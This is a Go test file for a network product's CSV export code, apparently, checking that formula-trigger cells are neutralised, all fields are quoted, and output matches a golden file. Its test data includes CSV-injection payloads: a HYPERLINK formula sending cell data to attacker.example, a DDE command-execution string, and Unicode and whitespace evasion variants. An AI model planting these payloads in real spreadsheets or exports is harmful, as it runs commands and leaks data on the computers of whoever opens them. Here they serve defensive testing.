package export_test

import (
	"bytes"
	"encoding/csv"
	"encoding/json"
	"flag"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/kiennt048/foyer/internal/export"
	"github.com/kiennt048/foyer/internal/store"
)

// TestNeutraliseDefusesEveryTriggerOWASPNames is the CSV-injection guarantee.
//
// The hostile values are the ones the OWASP page and the public write-ups use —
// DDE command execution, an exfiltrating HYPERLINK, the tab and line-break forms
// that some spreadsheets strip before evaluating, and the full-width forms some
// locales accept — plus the ones this product actually carries: a username, a
// Calling-Station-Id a NAS relayed verbatim, an SSID. Every one must come back as
// text a spreadsheet will display.
func TestNeutraliseDefusesEveryTriggerOWASPNames(t *testing.T) {
	hostile := []string{
		"=1+1",
		`=HYPERLINK("https://attacker.example/?d="&A2,"Click")`,
		`=cmd|' /C calc'!A0`,
		"+1+1",
		"-1+1",
		"-2e3",
		"@SUM(A1:A9)",
		"\t=1+1",
		"\r=1+1",
		"\n=1+1",
		"＝1+1",
		"＋1",
		"－1",
		"＠SUM(A1)",
		"-",
		"=",
		// What a spreadsheet looks past
		// before deciding a value is a formula, and the operator variants a
		// compatibility-normalising reader folds onto `= + - @`.
		" =1+1",
		"   @SUM(A1)",
		"\u00a0=1+1",       // NO-BREAK SPACE
		"\u0085=1+1",       // NEXT LINE
		"\u3000+1",         // IDEOGRAPHIC SPACE
		"\ufeff=1+1",       // BYTE ORDER MARK
		"\u200b=1+1",       // ZERO WIDTH SPACE
		"\u200e\u00a0-1+1", // LEFT-TO-RIGHT MARK, then NBSP
		"\ufe661+1",        // SMALL EQUALS SIGN
		"\ufe621",          // SMALL PLUS SIGN
		"\ufe631",          // SMALL HYPHEN-MINUS
		"\ufe6bSUM(A1)",    // SMALL COMMERCIAL AT
		"\u22121+1",        // MINUS SIGN
		" -12",             // not a plain decimal once it carries a blank
		" \t=1",            // a space, then a tab that is itself a trigger
	}
	for _, v := range hostile {
		got := export.Neutralise(v)
		if got != "'"+v {
			t.Errorf("Neutralise(%q) = %q, want it prefixed with a single quote", v, got)
		}
	}
}

// TestNeutraliseLeavesPlainValuesAlone is the other direction, and the reason is
// the one column that would otherwise be ruined: a negative `sessionSeconds` from a
// skewed NAS clock is the anomaly the contract wants sortable.
func TestNeutraliseLeavesPlainValuesAlone(t *testing.T) {
	plain := []string{"", "alice", "-12", "12", "0", "3.14", "-0.5", "a=b", "nguyen.thi.mai",
		"aa:bb:cc:dd:ee:ff", "2026-09-23T04:00:00Z", "Cà Phê Sữa", "'already quoted",
		" leading space", "\u00a0Cà Phê", "\ufeffalice", "   ", "a;=b"}
	for _, v := range plain {
		if got := export.Neutralise(v); got != v {
			t.Errorf("Neutralise(%q) = %q, want it unchanged", v, got)
		}
	}
}

// TestWriterCannotEmitAnUnneutralisedCell drives the writer rather than the
// function: a column added later must be safe by construction.
func TestWriterCannotEmitAnUnneutralisedCell(t *testing.T) {
	var buf bytes.Buffer
	w := export.NewWriter(&buf)
	if err := w.Header([]string{"username", "ssid", "note"}); err != nil {
		t.Fatal(err)
	}
	if err := w.Row([]string{"=1+1", "Guest, \"free\"", "two\nlines"}); err != nil {
		t.Fatal(err)
	}
	if err := w.Flush(); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.HasPrefix(out, "\uFEFF") {
		t.Fatalf("no byte-order mark: %q", out[:min(10, len(out))])
	}
	if !strings.Contains(out, "\r\n") {
		t.Errorf("records are not CRLF-terminated (RFC 4180): %q", out)
	}
	recs, err := csv.NewReader(strings.NewReader(strings.TrimPrefix(out, "\uFEFF"))).ReadAll()
	if err != nil {
		t.Fatalf("the document is not CSV a reader can parse: %v\n%q", err, out)
	}
	want := [][]string{{"username", "ssid", "note"}, {"'=1+1", `Guest, "free"`, "two\nlines"}}
	if len(recs) != 2 {
		t.Fatalf("got %d records, want 2 — a separator or line break in a value opened a new cell or row\n%q", len(recs), out)
	}
	for i := range want {
		for j := range want[i] {
			if recs[i][j] != want[i][j] {
				t.Errorf("record %d cell %d = %q, want %q", i, j, recs[i][j], want[i][j])
			}
		}
	}
}

// TestEveryFieldIsQuotedSoNoSeparatorOpensACell is the `;`-locale case.
//
// Excel takes its CSV separator from the Windows list separator, which is `;` in
// much of Europe. A bare field `a;=cmd|…` is then two cells, and the second one is a
// formula `Neutralise` never saw the start of. Quoting every field makes the `;`
// data in any reader that honours RFC 4180 quotes, whatever separator it uses — so
// the document is read here with a quote-honouring splitter for `,`, `;` and TAB,
// and no cell may begin, past blanks, with a trigger.
func TestEveryFieldIsQuotedSoNoSeparatorOpensACell(t *testing.T) {
	var buf bytes.Buffer
	w := export.NewWriter(&buf)
	if err := w.Header([]string{"username", "ssid", "n"}); err != nil {
		t.Fatal(err)
	}
	for _, row := range [][]string{
		{"a;=cmd|' /C calc'!A0", "x;@SUM(A1)", "-12"},
		{"b\t+1", "c;\u00a0=1", ""},
		{"plain", "a,=1", "3.14"},
	} {
		if err := w.Row(row); err != nil {
			t.Fatal(err)
		}
	}
	if err := w.Flush(); err != nil {
		t.Fatal(err)
	}
	doc := strings.TrimPrefix(buf.String(), "\ufeff")
	for _, rec := range strings.Split(strings.TrimSuffix(doc, "\r\n"), "\r\n") {
		for _, f := range splitQuoted(rec, ',') {
			if len(f) < 2 || f[0] != '"' || f[len(f)-1] != '"' {
				t.Errorf("field %q of record %q is not quoted", f, rec)
			}
		}
		for _, sep := range []rune{',', ';', '\t'} {
			for _, cell := range splitQuoted(rec, sep) {
				v := strings.TrimLeft(strings.Trim(cell, `"`), " \u00a0")
				if v != "" && strings.ContainsRune("=+-@", rune(v[0])) && v != "-12" {
					t.Errorf("read with separator %q, record %q has a cell %q a spreadsheet evaluates", sep, rec, cell)
				}
			}
		}
	}
}

// splitQuoted splits one record on sep outside double quotes, as a spreadsheet
// that honours RFC 4180 quoting does. Quotes are kept in the returned fields.
func splitQuoted(rec string, sep rune) []string {
	var out []string
	var cur strings.Builder
	quoted := false
	for _, r := range rec {
		switch {
		case r == '"':
			quoted = !quoted
			cur.WriteRune(r)
		case r == sep && !quoted:
			out = append(out, cur.String())
			cur.Reset()
		default:
			cur.WriteRune(r)
		}
	}
	return append(out, cur.String())
}

func TestWriterRefusesARowOfTheWrongWidth(t *testing.T) {
	var buf bytes.Buffer
	w := export.NewWriter(&buf)
	if err := w.Row([]string{"a"}); err == nil {
		t.Error("a row before the header was accepted")
	}
	_ = w.Header([]string{"a", "b"})
	if err := w.Row([]string{"a"}); err == nil {
		t.Error("a short row was accepted — every later cell would sit under the wrong heading")
	}
}

func TestCodeHintNeverCarriesTheCode(t *testing.T) {
	if got := export.CodeHint("ABCDEFGHJKMN"); got != "…JKMN" {
		t.Errorf("CodeHint = %q, want the last four behind an ellipsis", got)
	}
	if got := export.CodeHint("ABCD"); got != "" {
		t.Errorf("CodeHint of a four-character code = %q, want nothing rather than all of it", got)
	}
}

func TestTimeIsUTCAtSecondPrecisionAndAbsentIsEmpty(t *testing.T) {
	ict := time.FixedZone("ICT", 7*3600)
	v := time.Date(2026, 9, 23, 11, 0, 0, 500_000_000, ict)
	if got := export.Time(&v); got != "2026-09-23T04:00:00Z" {
		t.Errorf("Time = %q", got)
	}
	if export.Time(nil) != "" || export.Int(nil) != "" || export.Bool(nil) != "" || export.Text(nil) != "" {
		t.Error("an absent value rendered as something other than an empty cell")
	}
}

// TestLocallyAdministeredAgreesWithTheStore holds the declared copy to its source.
func TestLocallyAdministeredAgreesWithTheStore(t *testing.T) {
	for _, mac := range []string{
		"aa:bb:cc:dd:ee:ff", "a8:5b:78:00:00:01", "02:00:00:00:00:00", "3C-22-FB-11-22-33",
		"da:a1:19:00:00:00", "3c22.fb11.2233", "", "x", "0", "fe", "FE:00:00:00:00:00",
	} {
		if got, want := export.LocallyAdministered(mac), store.MACIsLocallyAdministered(mac); got != want {
			t.Errorf("LocallyAdministered(%q) = %v, store says %v", mac, got, want)
		}
	}
}

var update = flag.Bool("update", false, "rewrite testdata/golden.csv from testdata/vectors.json")

// TestTheDocumentIsTheGolden pins the exact bytes, because two servers write this
// document and `make diff-api` compares them byte for byte. `web/mock`'s
// `reports.test.ts` reads the same two files and must produce the same bytes, so
// neither side can drift alone: a change to Go's quoting fails here, a change to
// the TypeScript fails there.
func TestTheDocumentIsTheGolden(t *testing.T) {
	raw, err := os.ReadFile("testdata/vectors.json")
	if err != nil {
		t.Fatal(err)
	}
	var v struct {
		Header []string   `json:"header"`
		Rows   [][]string `json:"rows"`
	}
	if err := json.Unmarshal(raw, &v); err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	w := export.NewWriter(&buf)
	if err := w.Header(v.Header); err != nil {
		t.Fatal(err)
	}
	for _, r := range v.Rows {
		if err := w.Row(r); err != nil {
			t.Fatal(err)
		}
	}
	if err := w.Flush(); err != nil {
		t.Fatal(err)
	}
	if *update {
		if err := os.WriteFile("testdata/golden.csv", buf.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	want, err := os.ReadFile("testdata/golden.csv")
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(buf.Bytes(), want) {
		t.Fatalf("the document is not the golden one\n got: %q\nwant: %q", buf.Bytes(), want)
	}
}
